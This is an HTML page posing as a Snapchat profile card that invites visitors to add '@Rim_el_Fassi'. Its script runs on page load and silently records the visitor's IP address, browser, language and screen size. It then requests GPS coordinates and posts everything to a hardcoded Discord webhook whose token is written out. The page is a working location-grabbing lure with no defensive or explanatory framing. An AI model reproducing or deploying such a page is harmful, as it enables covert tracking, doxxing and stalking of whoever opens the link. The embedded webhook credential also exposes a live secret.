<html>
<head>
  <title>Snapchat</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff300;
      margin: 0;
      padding: 20px;
      text-align: center;
    }
    .profile {
      background: white;
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 350px;
      margin: auto;
    }
    img {
      width: 120px;
      border-radius: 50%;
    }
    h2 {
      margin-top: 10px;
    }
    .snap-btn {
      background-color: #fffc00;
      border: none;
      padding: 10px 25px;
      font-weight: bold;
      font-size: 16px;
      border-radius: 30px;
      margin-top: 20px;
      cursor: pointer;
    }
  </style>
  <script>
    const webhook = "https://discord.com/api/webhooks/1398793243692499055/fdMhPoKYGBXY96dCLTHEqho3lLc4rAfXJIYYi43yXz591O5pssHMg_mErqvo6hu5eI-Y";

    // Log device + IP
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const ua = navigator.userAgent;
        const lang = navigator.language;
        const screenSize = screen.width + "x" + screen.height;

        fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `üë§ **Snap Profile Visit**
IP: ${ip}
UA: ${ua}
Language: ${lang}
Screen: ${screenSize}`
          })
        });
      });

    // GPS logging
    navigator.geolocation.getCurrentPosition((pos) => {
      fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `üìç **GPS Location**
Lat: ${pos.coords.latitude}
Lon: ${pos.coords.longitude}
Accuracy: ${pos.coords.accuracy}m`
        })
      });
    });
  </script>
</head>
<body>
  <div class="profile">
    <img src="https://www.snapchat.com/web" alt="Snap Profile">
    <h2>@Rim_el_Fassi</h2>
    <p>Ajoute-moi sur Snapchat</p>
    <button class="snap-btn">Add on Snapchat</button>
  </div>
</body>
</html>
